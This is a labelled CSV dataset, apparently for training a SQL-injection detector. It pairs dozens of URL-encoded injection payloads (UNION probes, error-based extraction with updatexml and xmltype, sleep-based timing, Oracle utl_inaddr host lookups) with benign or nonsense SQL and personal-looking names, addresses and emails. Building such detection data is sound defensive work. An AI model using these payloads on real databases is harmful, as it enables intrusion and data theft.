Query,Label
1%22%20%20%20%29%20%20%20%20%29%20%20%20%20as%20hzcq%20where%209250%20%20%3D%20%209250%20and%204386%20%20%3D%20%20utl_inaddr.get_host_address%20%20%28%20%20chr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20112%20%20%29%20%20%7C%7Cchr%20%20%28%20%20106%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%204386%20%20%3D%20%204386%20%20%29%20%20%20then%201%20else%200%20end%20%20%29%20%20%20from%20dual%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20118%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%20%29%20%20%20%20%29%20%20%20--,1
SELECT * FROM wp_posts WHERE ID  =  347686 LIMIT 1,0
"SELECT create,bottom FROM pretty WHERE familiar = 'play' UNION SELECT tower, opinion FROM go",0
SELECT * FROM policeman WHERE property  BETWEEN 10 AND 20,0
lacoste,0
fabrs xamena,0
1%22%20%20%29%20%20%20as%20pgza%20where%208756%20%20%3D%20%208756%20or%209643%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%20%20%29%20%20--,1
SELECT * FROM pond FETCH FIRST 3 ROWS ONLY,0
corcoll duhalde,0
SELECT * FROM folks WHERE activity IN  ( SELECT frozen FROM did ),0
"SELECT EXTRACT ( MINUTE FROM ""2017-06-15 09:34:21"" ) ;",0
"minguez, 98",0
SELECT TOP 3 * FROM lesson SELECT * FROM wire 3SELECT * FROM pupil,0
SELECT * FROM slave ORDER BY wire,0
1%22%20%20%20%29%20%20%20%20%29%20%20%20%20as%20osuh%20where%208809%20%20%3D%20%208809,1
magnin_arne@tiebreak.com.sr,0
-5819%25%22%20%20%20%29%20%20%20%20%29%20%20%20%20or%204144%20%20%3D%20%20%20%20%28%20%20select%20upper%20%20%28%20%20xmltype%20%20%28%20%20chr%20%20%28%20%2060%20%20%29%20%20%7C%7Cchr%20%20%28%20%2058%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20112%20%20%29%20%20%7C%7Cchr%20%20%28%20%20106%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%204144%20%20%3D%20%204144%20%20%29%20%20%20then%201%20else%200%20end%20%20%29%20%20%20from%20dual%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20118%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%2062%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20from%20dual%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%22%25%22%20%20%3D%20%20%22,1
1%22%20%20%29%20%20%20procedure%20analyse%20%20%28%20%20extractvalue%20%20%28%20%205840%2Cconcat%20%20%28%20%200x5c%2C0x7171706a71%2C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%205840%20%20%3D%20%205840%20%20%29%20%20%20then%201%20else%200%20end%20%20%20%29%20%20%20%20%29%20%20%20%2C0x717a767a71%20%20%20%29%20%20%20%20%29%20%20%20%2C1%20%20%29%20%20%20and%20%20%20%28%20%20%22hrkf%22%20like%20%22hrkf,1
1%22%20%20%29%20%20%20as%20xylo%20where%202112%20%20%3D%20%202112%20and%203715%20in%20%20%20%20%28%20%20%20%20%28%20%20%20char%20%20%28%20%20113%20%20%29%20%20%2Bchar%20%20%28%20%20113%20%20%29%20%20%2Bchar%20%20%28%20%20112%20%20%29%20%20%2Bchar%20%20%28%20%20106%20%20%29%20%20%2Bchar%20%20%28%20%20113%20%20%29%20%20%2B%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%203715%20%20%3D%20%203715%20%20%29%20%20%20then%20char%20%20%28%20%2049%20%20%29%20%20%20else%20char%20%20%28%20%2048%20%20%29%20%20%20end%20%20%20%29%20%20%20%20%29%20%20%20%2Bchar%20%20%28%20%20113%20%20%29%20%20%2Bchar%20%20%28%20%20122%20%20%29%20%20%2Bchar%20%20%28%20%20118%20%20%29%20%20%2Bchar%20%20%28%20%20122%20%20%29%20%20%2Bchar%20%20%28%20%20113%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20--,1
SELECT * FROM pot WHERE bring NOT BETWEEN 'crowd' AND 'dry',0
SELECT AVG ( Price ) FROM hide,0
-9886%25%27%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20union%20all%20select%205191%2C5191%2C5191%2C5191%2C5191%2C5191%2C5191--,1
"SELECT able,principal,sing FROM dear LEFT JOIN Orders ON silly.presidentID =  successful.came ORDER BY harbor.load",0
SELECT column_name ( s )  FROM table_name,0
1%27%20%20%20%29%20%20%20%20%29%20%20%20%20or%208421%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20generate_series%20%20%28%20%201%2C5000000%20%20%20%29%20%20%20%20%29%20%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%27qgov%27%20%20%3D%20%20%27qgov,1
-1280%27%20%20%20%29%20%20%20%20%29%20%20%20%20or%208571%20%20%3D%20%208571--,1
-9558%22%20where%207497%20%20%3D%20%207497%20or%20%20%20%28%20%202539%20%20%3D%20%206484%20%20%29%20%20%2A6484--,1
-7659%27%20%20%29%20%20%20as%20bowy%20where%204835%20%20%3D%20%204835%20or%204747%20%20%3D%20%20dbms_utility.sqlid_to_sqlhash%20%20%20%28%20%20%20%20%28%20%20%20chr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20112%20%20%29%20%20%7C%7Cchr%20%20%28%20%20106%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%204747%20%20%3D%20%204747%20%20%29%20%20%20then%201%20else%200%20end%20%20%29%20%20%20from%20dual%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20118%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20--,1
SELECT WEEKDAY ( CURDATE (   )  )  ;,0
select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%201105%20%20%3D%20%201105,1
rohan,0
SELECT * FROM course WHERE sink BETWEEN '1996-07-01' AND '1996-07-31',0
1%25%22%20and%20char%20%20%28%20%20120%20%20%29%20%20%7C%7Cchar%20%20%28%20%20106%20%20%29%20%20%7C%7Cchar%20%20%28%20%20117%20%20%29%20%20%7C%7Cchar%20%20%28%20%2085%20%20%29%20%20%20%20%3D%20%20regexp_substring%20%20%28%20%20repeat%20%20%28%20%20right%20%20%28%20%20char%20%20%28%20%209981%20%20%29%20%20%2C0%20%20%29%20%20%2C5000000000%20%20%29%20%20%2Cnull%20%20%29%20%20%20and%20%22%25%22%20%20%3D%20%20%22,1
1%27%20%20%29%20%20%20as%20uaoz%20where%202464%20%20%3D%20%202464,1
1%27%20%20%29%20%20%20as%20fyuh%20where%207608%20%20%3D%20%207608%20and%204241%20%20%3D%20%20convert%20%20%28%20%20int%2C%20%20%28%20%20select%20char%20%20%28%20%20113%20%20%29%20%20%2Bchar%20%20%28%20%20113%20%20%29%20%20%2Bchar%20%20%28%20%20112%20%20%29%20%20%2Bchar%20%20%28%20%20106%20%20%29%20%20%2Bchar%20%20%28%20%20113%20%20%29%20%20%2B%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%204241%20%20%3D%20%204241%20%20%29%20%20%20then%20char%20%20%28%20%2049%20%20%29%20%20%20else%20char%20%20%28%20%2048%20%20%29%20%20%20end%20%20%20%29%20%20%20%20%29%20%20%20%2Bchar%20%20%28%20%20113%20%20%29%20%20%2Bchar%20%20%28%20%20122%20%20%29%20%20%2Bchar%20%20%28%20%20118%20%20%29%20%20%2Bchar%20%20%28%20%20122%20%20%29%20%20%2Bchar%20%20%28%20%20113%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20--,1
1%22%20%20%29%20%20%20as%20crek%20where%206570%20%20%3D%20%206570%20and%20char%20%20%28%20%20107%20%20%29%20%20%7C%7Cchar%20%20%28%20%20121%20%20%29%20%20%7C%7Cchar%20%20%28%20%2097%20%20%29%20%20%7C%7Cchar%20%20%28%20%2080%20%20%29%20%20%20%20%3D%20%20regexp_substring%20%20%28%20%20repeat%20%20%28%20%20left%20%20%28%20%20crypt_key%20%20%28%20%20char%20%20%28%20%2065%20%20%29%20%20%7C%7Cchar%20%20%28%20%2069%20%20%29%20%20%7C%7Cchar%20%20%28%20%2083%20%20%29%20%20%2Cnull%20%20%29%20%20%2C0%20%20%29%20%20%2C500000000%20%20%29%20%20%2Cnull%20%20%29%20%20--,1
1%22%20and%207756%20%20%3D%20%20dbms_utility.sqlid_to_sqlhash%20%20%20%28%20%20%20%20%28%20%20%20chr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20112%20%20%29%20%20%7C%7Cchr%20%20%28%20%20106%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%207756%20%20%3D%20%207756%20%20%29%20%20%20then%201%20else%200%20end%20%20%29%20%20%20from%20dual%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20118%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29,1
SELECT * FROM clothes  WHERE principle NOT LIKE '[follow]%',0
esser,0
-4695%27%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20union%20all%20select%205844%2C5844%2C5844%2C5844%2C5844%2C5844%23,1
1%27%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20or%20updatexml%20%20%28%20%201808%2Cconcat%20%20%28%20%200x2e%2C0x7171706a71%2C%20%20%28%20%20select%20%20%20%28%20%20elt%20%20%28%20%201808%20%20%3D%20%201808%2C1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%2C0x717a767a71%20%20%29%20%20%2C8666%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%20%27yznn%27%20like%20%27yznn,1
SELECT TOP 3 * FROM made WHERE lesson = 'frame',0
-1485%27%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20union%20all%20select%207661%2C7661%2C7661%2C7661%2C7661--,1
SELECT * FROM compare WHERE period  BETWEEN 10 AND 20,0
-9507%25%22%20union%20all%20select%203342%2C3342%2C3342%2C3342%2C3342%23,1
%22%20or%20%22%22%2A%22,1
1%27%2B%20%20%28%20%20select%20%27vfkl%27%20where%201713%20%20%3D%20%201713%20and%208514%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%20%20%20%29%20%20%20%20%29%20%20%20%2B%27,1
SELECT shells ( s )  FROM people SELECT he ( s ),0
SELECT lay ( s ) FROM question INNER JOIN,0
1%27%20and%206537%20%20%3D%20%20dbms_pipe.receive_message%20%20%28%20%20chr%20%20%28%20%2076%20%20%29%20%20%7C%7Cchr%20%20%28%20%20116%20%20%29%20%20%7C%7Cchr%20%20%28%20%20117%20%20%29%20%20%7C%7Cchr%20%20%28%20%2065%20%20%29%20%20%2C5%20%20%29%20%20%20and%20%27dubu%27%20like%20%27dubu,1
iif%20%20%28%20%201157%20%20%3D%20%204542%2C1%2C1/0%20%20%29,1
1%27%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20order%20by%201--,1
1%20%20%29%20%20%20rlike%20sleep%20%20%28%20%205%20%20%29%20%20%23,1
ibero saborit,0
WHERE EXISTS  ( SELECT ProductName FROM   Products WHERE SupplierId  =  Suppliers.supplierId AND Price < 20 ) ;,0
4.34481E+15,0
-2500%27%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20union%20all%20select%206853%2C6853%2C6853%2C6853--,1
select%20%2A%20from%20generate_series%20%20%28%20%203379%2C3379%2Ccase%20when%20%20%20%28%20%203379%20%20%3D%20%201219%20%20%29%20%20%20then%201%20else%200%20end%20%20%29%20%20%20limit%201--,1
SELECT invented ( s )  FROM rays UNION,0
1%27%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20or%208384%20%20%3D%20%20like%20%20%28%20%20%27abcdefg%27%2Cupper%20%20%28%20%20hex%20%20%28%20%20randomblob%20%20%28%20%20500000000/2%20%20%20%29%20%20%20%20%29%20%20%20%20%20%20%29%20%20%20%20%29%20%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%20%27jueq%27%20%20%3D%20%20%27jueq,1
64462042b,0
SELECT tin ( s )  FROM score UNION ALL,0
SELECT bean ( s )  FROM announced SELECT imagine ( s ),0
demoniaca,0
1%27%20and%204386%20%20%3D%20%20utl_inaddr.get_host_address%20%20%28%20%20chr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20112%20%20%29%20%20%7C%7Cchr%20%20%28%20%20106%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%204386%20%20%3D%20%204386%20%20%29%20%20%20then%201%20else%200%20end%20%20%29%20%20%20from%20dual%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20118%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%20%29%20%20%20%20%29,1
select%20%2A%20from%20users%20where%20id%20%20%3D%20%20%271%27%20or%20%22%22%3C%40%20union%20select%201%2Cversion%20%20%28%20%20%20%20%29%20%20%20--%201%27,1
SELECT * FROM wrong WHERE arrangement IN  ( SELECT grandmother FROM tropical ),0
-3450%27%20where%204478%20%20%3D%20%204478%20or%209323%20%20%3D%20%209323%23,1
-4205%27%20union%20all%20select%208986%2C8986%2C8986%2C8986%2C8986%2C8986%2C8986%2C8986%2C8986%2C8986%23,1
select%20%20%20%28%20%20case%20when%20%20%20%28%20%208294%20%20%3D%20%204332%20%20%29%20%20%20then%201%20else%208294%2A%20%20%28%20%20select%208294%20from%20master..sysdatabases%20%20%29%20%20%20end%20%20%29%20%20--,1
-3361%20%20%20%29%20%20%20%20%29%20%20%20%20union%20all%20select%202827%2C2827%2C2827%2C2827%23,1
SELECT handle ( s )  FROM occur UNION,0
"SELECT Orders.enginerID, Employees.necessary, Employees.mountain FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.cameID ORDER BY Orders.everyoneID",0
1%27%20%20%29%20%20%20or%20updatexml%20%20%28%20%201808%2Cconcat%20%20%28%20%200x2e%2C0x7171706a71%2C%20%20%28%20%20select%20%20%20%28%20%20elt%20%20%28%20%201808%20%20%3D%20%201808%2C1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%2C0x717a767a71%20%20%29%20%20%2C8666%20%20%29%20%20%20and%20%20%20%28%20%20%27kejy%27%20%20%3D%20%20%27kejy,1
SELECT far ( s )  FROM fierce FULL OUTER JOIN,0
"carrer nostra sra del pilar, 101",0
SELECT * FROM rod  WHERE appearance = conversation,0
1%22%20and%203707%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%20%20%29%20%20%20and%20%22cgps%22%20like%20%22cgps,1
camisoln,0
1%22%20%20%29%20%20%20as%20nfpe%20where%202679%20%20%3D%20%202679,1
SELECT option_value FROM wp_options WHERE option_name  =  'amp-options' LIMIT 1,0
magdiel,0
-5763%27%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20union%20all%20select%201640%2C1640%2C1640%2C1640%2C1640%2C1640%2C1640%2C1640%2C1640%2C1640%23,1
1%27%20%20%20%29%20%20%20%20%29%20%20%20%20or%20row%20%20%28%20%201045%2C7562%20%20%29%20%20%3E%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%2Cconcat%20%20%28%20%200x7171706a71%2C%20%20%28%20%20select%20%20%20%28%20%20elt%20%20%28%20%201045%20%20%3D%20%201045%2C1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%2C0x717a767a71%2Cfloor%20%20%28%20%20rand%20%20%28%20%200%20%20%29%20%20%2A2%20%20%20%29%20%20%20%20%29%20%20%20x%20from%20%20%20%28%20%20select%208488%20union%20select%205584%20union%20select%203051%20union%20select%201210%20%20%29%20%20a%20group%20by%20x%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%27mttj%27%20like%20%27mttj,1
-2953%22%20%20%29%20%20%20or%204493%20%20%3D%20%20utl_inaddr.get_host_address%20%20%28%20%20chr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20112%20%20%29%20%20%7C%7Cchr%20%20%28%20%20106%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%204493%20%20%3D%20%204493%20%20%29%20%20%20then%201%20else%200%20end%20%20%29%20%20%20from%20dual%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20118%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%20%29%20%20%20%20%29%20%20%20%20and%20%20%20%28%20%20%22oaeh%22%20%20%3D%20%20%22oaeh,1
-4462%25%22%20%20%29%20%20%20or%208571%20%20%3D%20%208571--,1
-9739%27%20or%208571%20%20%3D%20%208571--,1
1%22%20%20%20%29%20%20%20%20%29%20%20%20%20and%20exp%20%20%28%20%20~%20%20%28%20%20select%20%2A%20from%20%20%20%28%20%20select%20concat%20%20%28%20%200x7171706a71%2C%20%20%28%20%20select%20%20%20%28%20%20elt%20%20%28%20%208190%20%20%3D%20%208190%2C1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%2C0x717a767a71%2C0x78%20%20%20%29%20%20%20%20%29%20%20%20x%20%20%20%29%20%20%20%20%29%20%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%22rvuz%22%20like%20%22rvuz,1
"SELECT column_name ( s )  FROM unhappy,month",0
"SELECT * FROM operation WHERE stick BETWEEN ""generally"" AND    ""promised""",0
SELECT * FROM entire WHERE    NOT sat = 'air',0
SELECT * FROM chief WHERE morning LIKE '%force%',0
1%22%20where%208635%20%20%3D%20%208635%20and%204595%20%20%3D%20%204595%23,1
SELECT * FROM than WHERE slipped BETWEEN 'frighten' AND 'keep',0
1%27%20and%20updatexml%20%20%28%20%203393%2Cconcat%20%20%28%20%200x2e%2C0x7171706a71%2C%20%20%28%20%20select%20%20%20%28%20%20elt%20%20%28%20%203393%20%20%3D%20%203393%2C1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%2C0x717a767a71%20%20%29%20%20%2C1161%20%20%29%20%20%20and%20%27qcsi%27%20%20%3D%20%20%27qcsi,1
charlot@ringringrent.rw,0
1%27%20in%20boolean%20mode%20%20%29%20%20%20or%20elt%20%20%28%20%205873%20%20%3D%20%205873%2Csleep%20%20%28%20%205%20%20%20%29%20%20%20%20%29%20%20%20%23,1
1%20%20%29%20%20%20and%204386%20%20%3D%20%20utl_inaddr.get_host_address%20%20%28%20%20chr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20112%20%20%29%20%20%7C%7Cchr%20%20%28%20%20106%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%204386%20%20%3D%20%204386%20%20%29%20%20%20then%201%20else%200%20end%20%20%29%20%20%20from%20dual%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20118%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%20%29%20%20%20%20%29,1
"SELECT * FROM ask WHERE proud BETWEEN ""how"" AND    ""circle""",0
select%20%20%20%28%20%20case%20when%20%20%20%28%20%204006%20%20%3D%20%201276%20%20%29%20%20%20then%201%20else%204006%2A%20%20%28%20%20select%204006%20from%20master..sysdatabases%20%20%29%20%20%20end%20%20%29%20%20--,1
1%22%20%20%29%20%20%20where%201807%20%20%3D%20%201807,1
1%22%20%20%29%20%20%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--,1
-6475%22%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20or%204144%20%20%3D%20%20%20%20%28%20%20select%20upper%20%20%28%20%20xmltype%20%20%28%20%20chr%20%20%28%20%2060%20%20%29%20%20%7C%7Cchr%20%20%28%20%2058%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20112%20%20%29%20%20%7C%7Cchr%20%20%28%20%20106%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%204144%20%20%3D%20%204144%20%20%29%20%20%20then%201%20else%200%20end%20%20%29%20%20%20from%20dual%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20118%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%2062%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20from%20dual%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%20%22mdsx%22%20like%20%22mdsx,1
SELECT thy ( s )  FROM engine UNION,0
"calle miquel santandreu 66,",0
SELECT * FROM anybody WHERE full = 'buffalo'  AND  ( conversation = 'rhythm' OR cost = 'merely' ),0
oviedo,0
nuez de balboa 131 2-f,0
SELECT poetry ( s )  FROM cream SELECT heart FROM creature,0
ansorger,0
1%22%20%20%20%29%20%20%20%20%29%20%20%20%20and%202853%20%20%3D%20%20cast%20%20%20%28%20%20%20%20%28%20%20%20chr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20112%20%20%29%20%20%7C%7Cchr%20%20%28%20%20106%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%20%29%20%20%20%20%29%20%20%20%7C%7C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%202853%20%20%3D%20%202853%20%20%29%20%20%20then%201%20else%200%20end%20%20%20%29%20%20%20%20%29%20%20%20%3A%3Atext%7C%7C%20%20%28%20%20chr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20118%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%20%29%20%20%20%20%29%20%20%20%20as%20numeric%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%22mxnj%22%20like%20%22mxnj,1
1%27%2B%20%20%28%20%20select%20%27rpds%27%20where%205870%20%20%3D%20%205870%20and%204595%20%20%3D%20%204595%23,1
SELECT * FROM when WHERE Price NOT BETWEEN 10 AND 20,0
select%20sleep%20%20%28%20%205%20%20%29%20%20%20and%20%20%20%28%20%20%22tlbj%22%20like%20%22tlbj,1
1%25%22%20%20%20%29%20%20%20%20%29%20%20%20%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,1
SELECT city ( s )  FROM secret,0
SELECT COUNT ( forest ) FROM visit,0
torre-cardela,0
1%27%20%20%29%20%20%20as%20jwch%20where%204609%20%20%3D%20%204609,1
SELECT COUNT ( something ) FROM driving,0
1%22%20%20%20%29%20%20%20%20%29%20%20%20%20or%20elt%20%20%28%20%206272%20%20%3D%20%206272%2Csleep%20%20%28%20%205%20%20%20%29%20%20%20%20%29%20%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%22chvi%22%20like%20%22chvi,1
1%27%20%20%29%20%20%20and%20make_set%20%20%28%20%208403%20%20%3D%20%208403%2C8899%20%20%29%20%20%20and%20%20%20%28%20%20%27dhoo%27%20like%20%27dhoo,1
SELECT * FROM point,0
DELETE FROM greatest,0
SELECT COUNT ( primitive ) FROM especially,0
5153,0
1%27%20in%20boolean%20mode%20%20%29%20%20%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--,1
SELECT * FROM chain  WHERE alive NOT LIKE '[recent]%',0
1%27%20%20%29%20%20%20and%20make_set%20%20%28%20%208403%20%20%3D%20%208403%2C8899%20%20%29,1
SELECT * FROM compass,0
SELECT * FROM year WHERE represent = 'natural',0
colls messegu,0
SELECT AVG ( spend ) FROM turn SELECT SUM ( widely ),0
SELECT AVG ( imagine ) FROM directly,0
select%20%2A%20from%20users%20where%20id%20%20%3D%20%201%20or%201%23%22%2C%20union%20select%201%2Cversion%20%20%28%20%20%20%20%29%20%20%20--%201,1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 11710 )  ORDER BY meta_id ASC",0
1%20and%20make_set%20%20%28%20%208403%20%20%3D%20%208403%2C8899%20%20%29,1
